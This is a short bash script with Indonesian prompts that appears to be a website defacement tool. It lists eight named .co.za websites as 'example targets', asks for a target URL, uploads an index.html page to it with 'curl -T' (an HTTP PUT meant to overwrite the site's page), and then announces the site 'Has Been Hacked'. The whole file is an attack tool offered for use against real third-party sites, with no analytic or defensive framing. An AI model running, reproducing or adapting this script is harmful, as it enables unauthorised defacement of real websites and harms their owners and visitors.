green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"






clear
echo $green
echo Simpan SC Di Memory Internal Di Luar Folder
echo Contoh Target:
echo $red
echo "http://colourfactory.co.za"          
echo $cyan 
echo "http://chillibitez.co.za"
echo $red
echo "http://centraltech.co.za"
echo $cyan
echo "http://windmillsandporcupines.co.za"
echo $red
echo "http://mpark.co.za"
echo $cyan
echo "http://ratia.co.za "
echo $red
echo "http://itsengineering.co.za new"
echo $cyan
echo "http://uzingela.co.za new"
echo $green
echo eksekusi target
read -p "Target=>"  target

curl -T index.html $target

echo $target Has Been Hacked
